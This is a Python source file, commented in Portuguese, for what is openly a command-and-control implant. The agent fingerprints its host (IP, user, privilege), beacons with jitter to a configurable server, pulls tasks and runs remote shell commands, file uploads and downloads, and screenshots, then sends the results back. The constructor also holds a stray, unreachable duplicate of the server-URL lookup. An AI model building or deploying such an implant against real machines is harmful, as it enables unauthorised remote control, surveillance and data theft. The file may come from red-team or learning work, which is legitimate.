import time
import json
import socket
import requests
import platform
import getpass
import os
import subprocess
import uuid
from datetime import datetime
from typing import Dict, Any, Optional, List
from handlers.system import handle_cmd, handle_sysinfo, handle_cd, handle_whoami
from handlers.file_ops import handle_download, handle_upload
from handlers.screen import handle_screenshot


def get_server_url():
    if os.getenv("SERVER_URL"):
        return os.getenv("SERVER_URL")
    
    if os.path.exists("config.json"):
        with open("config.json") as f:
            return json.load(f).get("server_url")
    
    return "http://127.0.0.1:8080"

class Agent:
    def __init__(self, sid: str = None, initial_data: Optional[Dict] = None, server_url: str = "http://127.0.0.1:8080"):
        
        #SESSÃO PARA ID
        
        self.sid = sid or str(uuid.uuid4())
        self.id = self.sid 
        self.server_url = server_url
        
        #SESSÃO PARA INFO DO HOST
        
        self.ip = self._get_ip()
        self.hostname = platform.node()
        self.username = getpass.getuser()
        self.os = platform.system()
        self.os_version = platform.version()
        self.platform = platform.platform()
        self.architecture = platform.machine()
        self.cwd = os.getcwd()
        self.status = "Active"
        self.last_seen = time.time()
        self.privilege = self._get_privilege()
        self.pid = os.getpid()
        
        # METADADOS EXTRAS
        
        self.start_time = datetime.now().isoformat()
        self.tasks: List[Dict] = []
        self.results: Dict = {}
        
        self.beacon_interval = 60
        self.jitter = 20
        
        if initial_data:
            self._update_from_dict(initial_data)
        
        self.handlers = {
                        "cmd": handle_cmd,
                        "shell": handle_cmd,

                        "sysinfo": handle_sysinfo,
                        "cd": handle_cd,
                        "whoami": handle_whoami,

                        "download": handle_download,
                        "upload": handle_upload,

                        "screenshot": handle_screenshot}

    
        if os.getenv("SERVER_URL"):
            return os.getenv("SERVER_URL")
        
        if os.path.exists("config.json"):
            with open("config.json") as f:
                return json.load(f).get("server_url")
        
        return "http://127.0.0.1:8080"

    def _get_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip 
        except Exception:
            return "Unknown"
    def _get_privilege(self) -> str:
        try:
            if self.os.lower() == "windows":
                import ctypes
                return "Administrator" if ctypes.windll.shell32.IsUserAnAdmin() else "User"
            else:
                return "Root" if os.getuid() == 0 else "User"
        except:
            return "User"
        
    def _update_from_dict(self, data: Dict):
        for Key, value in data.items():
            if hasattr(self, Key):
                setattr(self, Key, value)
                
    def get_info(self) -> Dict[str,Any]:
        return {
            "sid": self.sid,
            "id": self.id,
            "ip": self.ip,
            "hostname": self.hostname,
            "username": self.username,
            "os": self.os,
            "os_version": self.os_version,
            "platform": self.platform,
            "architecture": self.architecture,
            "cwd": self.cwd,
            "status": self.status,
            "last_seen": self.last_seen,
            "privilege": self.privilege,
            "pid": self.pid,
            "start_time": self.start_time}
    def update_last_seen(self):
        self.last_seen = time.time()
        
    def check_in(self) -> Dict:
        self.update_last_seen()
        return {
            "action": "checkin",
            "agent_info": self.get_info(),
            "tasks": len(self.tasks)}
    def add_task(self, task: Dict):
        task["received_at"] = time.time()
        self.tasks.append(task)
        
    def get_next_task(self) -> Optional[Dict]:
        return self.tasks.pop(0) if self.tasks else None
    
    def execute_task(self, task: Dict) -> Dict:
        task_id = task.get("task_id")
        action = task.get("action", "").lower()
        result = {"task_id": task_id, 
                  "status": "error", 
                  "output": "", 
                  "error": ""}
        
        try:
            handler = self.handlers.get(action)
            
            if not handler:
                raise ValueError(f"Unknown action: {action}")
            handler_result = handler(self, task)
            
            result.update(handler_result)

        except subprocess.TimeoutExpired:
            result["error"] = "[!] Command timed out"
        except Exception as e:
            result["error"] = str(e)
            
        if task_id:
            self.results[task_id] = result
        return result
    
    def get_sleep_time(self) -> float:
        import random
        jitter_amount = self.beacon_interval * (self.jitter / 100.0)
        return self.beacon_interval + random.uniform(-jitter_amount, jitter_amount)
    
    def to_json(self) -> str:
        return json.dumps(self.get_info())
    
    def __str__(self):
        return f"Agent[{self.sid}] - {self.username}@{self.hostname} ({self.ip}) - {self.os} - {self.privilege}"
    
if __name__ == "__main__":
    agent = Agent(server_url=get_server_url())
    print(f"[+] Agent iniciado: {agent}")

    while True:
        try:
            checkin_data = agent.check_in()
            print(f"[*] Check-in enviado - {len(agent.tasks)} tarefas pendentes")
            
            response = requests.post(f"{agent.server_url}/checkin", json=checkin_data, timeout=10)
            if response.ok:
                tasks = response.json().get("tasks", [])
                for t in tasks:
                    agent.add_task(t)

            while task := agent.get_next_task():
                print(f"[+] Executando tarefa: {task.get('action')}")
                result = agent.execute_task(task)
                requests.post(f"{agent.server_url}/result", json=result)
                
            time.sleep(agent.get_sleep_time())
            
        except KeyboardInterrupt:
            print("\n [-] Agent finalizado pelo usuário")
            break
        except Exception as e:
            print(f"[-] Erro: {e}")
            time.sleep(10)

                